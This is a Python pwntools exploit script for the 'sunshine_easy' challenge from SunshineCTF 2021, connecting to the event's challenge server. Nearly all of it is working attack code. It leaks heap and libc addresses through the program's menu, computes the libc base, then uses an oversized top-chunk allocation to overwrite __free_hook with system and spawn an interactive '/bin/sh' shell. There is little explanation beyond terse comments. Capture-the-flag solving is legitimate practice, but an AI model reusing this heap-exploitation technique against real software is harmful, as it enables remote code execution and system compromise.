from pwn import *
from cffi import FFI
from ptpython.repl import embed
from pprint import pprint
from typing import List, Union

LONG_DOUBLE_WIDTH = 16

context.terminal = ["kitty", "-e", "sh", "-c"]

# p = process("./sunshine_easy")
p = remote("chal.2021.sunshinectf.org", 21001)
# gdb.attach(p,
# """
# b finish_up
# """)

libc = ELF("../dist/libc.so.6")


def get_one_gadgets(lib: str) -> List[int]:
    args = ["one_gadget", "-r"]
    if len(lib) == 40 and all(x in string.hexdigits for x in lib.hex()):
        args += ["-b", lib.hex()]
    else:
        args += [lib]
    return [
        int(offset)
        for offset in subprocess.check_output(args).decode("ascii").strip().split()
    ]


def insert(i: Union[float, bytes]) -> None:
    p.sendline(b"1")
    if isinstance(i, bytes):
        p.sendline(i)
    else:
        p.sendline(bytes(f"{i}", "utf-8"))


def prnt() -> None:
    p.sendline(b"3")


def remove() -> None:
    p.sendline(b"2")


def quit() -> None:
    p.sendline(b"4")


def border(s: str) -> bytes:
    ordered_bstr = "".join(s[i - 2 : i] for i in range(len(s), 1, -2))
    print(ordered_bstr)
    return bytes.fromhex(ordered_bstr)


# Massage cur_sz to leak only what we need
p.sendline(b"3")
for i in range(256 - 20):
    remove()

prnt()
p.recv(timeout=1)
p.recvuntil(b"{\n")
raw_vals = p.recvuntil(b"\n}").decode("utf-8").splitlines()[:-1]
vals = list(map(lambda l: l.lstrip().rstrip().split(" ")[2][:-1], raw_vals))
pprint(vals)
# chunk_addr = u64(bytes.fromhex(vals[0][-6:] + vals[1][:6]).ljust(8, b"\x00"))
chunk_addr = u64(bytes.fromhex(vals[8][:12]).ljust(8, b"\x00"))
print(f"Got chunk addr: {hex(chunk_addr)}")
# __GI___libc_free_addr = u64(bytes.fromhex(vals[1][-6:] + vals[2][:6]).ljust(8, b"\x00"))
__GI___libc_free_addr = u64(bytes.fromhex(vals[8][16:28]).ljust(8, b"\x00"))
print(f"Got __GI___libc_free addr: {hex(__GI___libc_free_addr)}")
print(f"Base __GI___libc_free addr: {hex(libc.symbols['__GI___libc_free'])}")
# embed(globals(), locals())
libc_base = __GI___libc_free_addr - libc.symbols["__GI___libc_free"]
print(f"Got libc base {libc_base}")
free_hook = libc_base + libc.symbols["__free_hook"]
print(f"Targeting free hook at: {hex(free_hook)}")
top_chunk_addr = chunk_addr + 0xA0
print(f"Top chunk addr {hex(top_chunk_addr)}")

target = free_hook
request_size = target - top_chunk_addr - 32

print(f"Allocation request size: {hex(request_size)}")

for i in range(20):
    remove()

for i in range(18):
    # insert(b"-nan")
    insert(833.5134684)

quit()

p.sendline(bytes(str(request_size), "utf-8"))
payload = b"/bin/sh\x00"
payload += b"\x00" * (cyclic_find(p64(0x6161616461616163)) - len(payload))
# gadget = get_one_gadgets(p.libc.path)[1] # rsp+0x30==NULL :check:
# print(f"Found one_gadget: {gadget}:{type(gadget)}")
payload += p64(libc_base + libc.symbols["system"])
p.sendline(payload)

p.interactive()
